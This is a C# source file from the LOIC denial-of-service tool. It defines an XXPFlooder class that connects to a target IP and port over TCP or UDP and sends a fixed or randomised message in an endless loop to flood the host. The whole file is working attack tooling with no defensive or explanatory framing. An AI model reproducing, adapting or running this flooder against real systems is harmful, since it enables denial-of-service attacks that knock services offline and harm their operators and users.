namespace LOIC.Flooders
{
	#region using directives
	using System.Collections.Generic;
	using System.Net.Sockets;
	using System.Text;
	using System.Threading;
	#endregion

	public class XXPFlooder : BaseFlooder
	{
		#region Fields
		// Refactored section
		protected static IList<TargetProtocol> protocols = new TargetProtocol[] { TargetProtocol.TCP, TargetProtocol.UDP };

		private string message;
		private bool randomizeMessage;
		private bool blockingSocket;
		private byte[] messageBuffer;
		#endregion

		#region Constructor
		public XXPFlooder (string ip, int port, TargetProtocol protocol, int delay, bool resp, string data, bool random) : base(ip, port, delay, protocol)
		{
			this.blockingSocket = resp;
			this.message = data;
			this.randomizeMessage = random;
		}
		#endregion

		#region Properties
		protected override IList<TargetProtocol> SupportedProtocols {
			get { return protocols; }
		}

		public int FloodCount { get; set; }
		#endregion

		#region Methods
		protected override void OnStart ()
		{
			if (randomizeMessage) {
				messageBuffer = Encoding.ASCII.GetBytes (Functions.RandomString ());
			} else {
				messageBuffer = Encoding.ASCII.GetBytes (message);
			}
		}

		protected override void OnRun ()
		{
			try {
				Socket socket;
				
				if (Protocol == TargetProtocol.TCP) {
					socket = new Socket (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket.NoDelay = true;
					
					// Connect
					while (IsFlooding) {
						try {
							socket.Connect (RemoteHost);
						} catch {
							continue;
						}
						break;
					}
					
					socket.Blocking = blockingSocket;
					try {
						// Flood
						while (IsFlooding) {
							FloodCount++;
							socket.Send (messageBuffer);
							if (Delay > 0)
								Thread.Sleep (Delay);
						}
					} catch {
					}
				} else if (Protocol == TargetProtocol.UDP) {
					socket = new Socket (AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
					socket.Blocking = blockingSocket;
					
					try {
						// Flood
						while (IsFlooding) {
							FloodCount++;
							socket.SendTo (messageBuffer, SocketFlags.None, RemoteHost);
							if (Delay > 0)
								Thread.Sleep (Delay);
						}
					} catch {
					}
				}
			} catch {
			}
		}
		#endregion
	}
}
